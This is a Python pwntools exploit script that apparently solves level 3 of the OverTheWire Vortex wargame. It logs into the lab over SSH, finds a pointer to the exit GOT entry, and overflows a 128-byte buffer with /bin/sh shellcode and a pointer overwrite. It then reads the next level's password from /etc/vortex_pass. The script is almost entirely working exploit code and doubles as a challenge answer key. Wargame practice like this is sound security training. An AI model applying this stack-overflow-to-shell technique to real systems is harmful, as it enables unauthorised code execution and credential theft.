#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *
context(arch='i386',os='linux')

level    = 3
host     = 'vortex.labs.overthewire.org'
user     = 'vortex%i' % level
chal     = 'vortex%i' % level
password  = args['PASSWORD']
passfile = '/etc/vortex_pass/vortex%i' % (level+1)
binary   = '/vortex/%s' % chal
shell    = ssh(host=host, user=user, password=password)

if not os.path.exists(binary):
    shell.download_file(binary)
    os.chmod('vortex3', 0755)

#
# Load the binary, find got:_exit, then find a pointer to it.
# The PLT 'jmp' instruction contains a pointer.
#
# .plt:08048320 ; void exit(int status)
# .plt:08048320 _exit           proc near
# .plt:08048320                 jmp     ds:off_8049738
# .plt:08048320 _exit           endp#
#
elf = ELF('vortex3')
p_exit = elf.plt['exit']+2
log.info('p_exit == %x' % p_exit)

#
# Double check that we're correct
#
# print elf.disasm(elf.plt['exit'], 6)
assert unpack(elf.read(p_exit,4)) == elf.got['exit']

# Build our args
#
# Stack layout:
# -00000088 buffer_128      db 128 dup(?)
# -00000008 deref_lpp       dd ?
# -00000004 lpp             dd ?
spam =  '' # '\xcc'
spam += asm(shellcraft.sh())
spam += cyclic(128 + 4 - len(spam))
spam += p32(p_exit)

r = shell.run('%s $%r' % (binary, spam))
r.clean()


r.sendline('id')
log.success('id: %s' % r.recv().strip())
r.sendline('cat /etc/vortex_pass/vortex4')
password = r.recv().strip()
log.success('Password: %s' % password)

print password
